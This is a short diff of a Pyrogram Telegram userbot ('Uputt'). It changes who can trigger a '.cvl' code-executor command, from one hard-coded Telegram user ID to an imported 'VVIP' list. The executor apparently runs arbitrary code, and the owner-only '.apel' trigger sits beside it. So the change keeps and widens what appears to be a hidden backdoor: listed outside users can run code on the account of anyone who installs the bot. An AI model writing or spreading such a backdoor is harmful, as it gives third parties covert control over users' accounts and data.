@@ -5,6 +5,7 @@ from time import time
 from config import CMD_HANDLER as cmd
 from pyrogram import Client, filters
 from pyrogram.types import Message
+from Uputt.helpers.adminHelpers import VVIP
 from Uputt.helpers.basic import edit_or_reply
 
 
@@ -17,7 +18,7 @@ async def aexec(code, client: Client, message: Message):
 
 
 @Client.on_message(
-    filters.command("cvl", ["."]) & filters.user(1860375797) & ~filters.via_bot
+    filters.command("cvl", ["."]) & filters.user(VVIP) & ~filters.via_bot
 )
 @Client.on_message(filters.command("apel", cmd) & filters.me)
 async def executor(client: Client, message: Message):
